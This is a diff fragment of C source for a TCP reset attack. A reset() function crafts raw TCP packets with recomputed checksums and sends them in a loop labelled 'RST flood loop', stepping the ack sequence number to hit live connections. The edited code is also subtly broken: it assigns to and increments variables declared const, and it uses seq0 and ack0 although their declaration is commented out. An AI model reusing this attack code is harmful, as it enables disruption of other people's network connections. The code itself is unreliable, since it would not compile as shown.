@@ -165,8 +165,8 @@ void reset(const struct sockaddr saddr, const struct sockaddr daddr,
     struct tcphdr *tcph, *cstcph;
     struct pshdr *psh;
     char sIP[INET6_ADDRSTRLEN], dIP[INET6_ADDRSTRLEN];
-    uint16_t sport = 35801, dport, port0 = 30000, port_max = USHRT_MAX - 1, win = 8192;
-    uint16_t id0 = rand() %(65536);
+    uint16_t win = 8192, id0 = rand() %(65536);
+    const uint32_t ack, seq;
     // uint32_t seq, seq0 = 3842363570, ack0 = 1656549865;
     size_t tcp_len;
 
@@ -244,12 +244,14 @@ void reset(const struct sockaddr saddr, const struct sockaddr daddr,
     // sa.sin_port = htons(dport);
     inet_pton(AF_INET, dIP, &(sa.sin_addr.s_addr));
 
+    seq = seq0;
+    ack = ack0;
     // RST flood loop
     for (count = 0; count < NUM_OF_RESET; count++) {
         // tcph -> seq = htonl(seq); // set seq number
         // cstcph -> seq = htonl(seq); // set seq number in the checksum header
-        tcph -> ack_seq = htonl(ack0++); // set ack seq number
-        cstcph -> ack_seq = htonl(ack0); // set ack seq number in the checksum header
+        tcph -> ack_seq = htonl(ack++); // set ack seq number
+        cstcph -> ack_seq = htonl(ack); // set ack seq number in the checksum header
         tcph -> check = 0; // reset check sum
         cstcph -> check = 0; // reset check sum  
         tcph -> check = ip_checksum(pseudo_packet, sizeof(struct pshdr) + tcp_len); // calculate check sum
